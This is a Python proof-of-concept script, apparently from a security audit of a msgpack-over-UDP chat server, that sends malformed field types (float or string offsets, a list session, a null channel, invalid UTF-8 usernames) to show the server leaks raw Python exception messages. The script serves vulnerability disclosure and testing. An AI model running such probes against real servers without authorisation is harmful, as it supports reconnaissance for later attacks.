"""
PoC: Server leaks raw Python exception messages.

Multiple request fields, when given unexpected types, cause the server to
return unhandled Python exceptions as error messages — revealing that the
server is Python, how it processes input internally, and hints about the
code structure.

Run with: uv run python vulnerabilities/pocs/poc_error_disclosure.py
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

import socket
import msgpack
from vulnerabilities.lib.probe import (
    SERVER_HOST, CLEAR_PORT, make_handle, connect_cleartext, send_recv
)

def main():
    sock, session, _ = connect_cleartext()

    probes = [
        (
            'CHANNEL_LIST with float offset',
            {'request_type': 5, 'session': session, 'request_handle': make_handle(), 'offset': 1.5},
            b'slice indices must be integers',
            'Server uses Python list slicing for pagination: data[offset:offset+n]'
        ),
        (
            'CHANNEL_LIST with string offset',
            {'request_type': 5, 'session': session, 'request_handle': make_handle(), 'offset': 'ten'},
            b'can only concatenate str',
            'Server concatenates offset directly: offset + int_value without type check'
        ),
        (
            'PING with session as list',
            {'request_type': 3, 'session': [session], 'request_handle': make_handle()},
            b"int() argument must be a string",
            'Server calls int(session) directly on the raw field value'
        ),
    ]

    print("Leaking Python internals via malformed field values:\n")
    leaked = []
    for label, msg, expected_fragment, implication in probes:
        r = send_recv(sock, msg)
        error = r.get(b'error', b'') if r else b''
        found = expected_fragment in error
        print(f"  [{'+' if found else ' '}] {label}")
        print(f"       Error returned:  {error.decode(errors='replace')}")
        print(f"       Implication:     {implication}\n")
        if found:
            leaked.append(label)
    sock.close()

    # Also test CHANNEL_CREATE with None channel (different socket for fresh session)
    sock2, session2, _ = connect_cleartext()
    r = send_recv(sock2, {
        'request_type': 4, 'session': session2,
        'request_handle': make_handle(),
        'channel': None, 'description': 'test'
    })
    error = r.get(b'error', b'') if r else b''
    if b"NoneType" in error:
        print(f"  [+] CHANNEL_CREATE with channel=None")
        print(f"       Error returned:  {error.decode()}")
        print(f"       Implication:     Server calls len(channel) without null check\n")
        leaked.append('CHANNEL_CREATE channel=None')
    sock2.close()

    # bytes vs str confusion (via raw socket)
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    raw_sock.settimeout(5.0)
    raw_sock.connect((SERVER_HOST, CLEAR_PORT))
    raw_sock.send(msgpack.packb({'request_type': 1, 'request_handle': make_handle()}))
    raw_session = msgpack.unpackb(raw_sock.recv(4096), raw=True)[b'session']
    raw_sock.send(msgpack.packb({
        'request_type': 13, 'session': raw_session,
        'request_handle': make_handle(), 'username': b'clear-\xc0\x80test'
    }))
    r = msgpack.unpackb(raw_sock.recv(4096), raw=True)
    error = r.get(b'error', b'')
    if b'startswith' in error:
        print(f"  [+] SET_USERNAME with raw bytes (invalid UTF-8)")
        print(f"       Error returned:  {error.decode()}")
        print(f"       Implication:     Server uses .startswith() and has bytes/str confusion\n")
        leaked.append('SET_USERNAME bytes')
    raw_sock.close()

    print('='*60)
    print(f"VULNERABLE: {len(leaked)} Python internal errors exposed")
    for l in leaked:
        print(f"  - {l}")
    print("\nThese errors reveal the server is Python and expose internal code patterns.")

if __name__ == '__main__':
    main()
